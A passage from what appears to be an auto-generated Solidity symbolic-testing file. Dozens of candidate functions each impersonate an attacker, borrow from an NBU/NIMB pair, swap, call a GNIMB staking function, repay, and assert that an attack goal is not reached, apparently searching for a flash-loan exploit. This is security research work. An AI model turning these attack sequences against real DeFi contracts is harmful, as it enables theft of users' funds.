        vm.stopPrank();
    }

    function check_cand4294(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4295(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4296(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4297(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4298(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4299(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4300(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4301(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4302(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4303(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4304(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4305(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4306(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4307(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4308(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4309(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4310(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4311(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4312(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4313(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4314(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4315(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4316(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4317(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4318(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4319(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4320(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4321(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4322(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4323(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4324(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4325(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4326(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4327(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4328(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4329(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4330(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4331(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4332(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4333(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4334(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4335(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4336(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4337(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4338(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4339(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
